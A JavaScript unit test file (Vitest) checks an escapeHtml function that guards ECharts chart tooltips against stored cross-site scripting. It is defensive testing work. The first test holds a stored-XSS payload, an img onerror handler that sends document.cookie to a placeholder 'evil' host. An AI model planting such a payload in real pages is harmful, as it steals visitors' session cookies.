import { describe, expect, it } from 'vitest';
import { escapeHtml } from './color';

describe('escapeHtml (ECharts tooltip XSS defence)', () => {
  it('neutralises the stored-XSS payload a chart note could carry', () => {
    const payload = `<img src=x onerror="fetch('//evil/?c='+document.cookie)">`;
    const out = escapeHtml(payload);
    // No live angle brackets or quotes survive to reach innerHTML.
    expect(out).not.toContain('<');
    expect(out).not.toContain('>');
    expect(out).not.toContain('"');
    expect(out).toContain('&lt;img');
    expect(out).toContain('onerror=');
  });

  it('escapes every HTML-significant character', () => {
    expect(escapeHtml('&')).toBe('&amp;');
    expect(escapeHtml('<')).toBe('&lt;');
    expect(escapeHtml('>')).toBe('&gt;');
    expect(escapeHtml('"')).toBe('&quot;');
    expect(escapeHtml("'")).toBe('&#39;');
  });

  it('escapes the ampersand first so entities are not double-broken', () => {
    // If `<` were escaped before `&`, the result would contain `&amp;lt;`.
    expect(escapeHtml('<&>')).toBe('&lt;&amp;&gt;');
  });

  it('leaves an ordinary note untouched in meaning', () => {
    expect(escapeHtml('Nasazena verze 2.4 (deploy)')).toBe('Nasazena verze 2.4 (deploy)');
  });
});
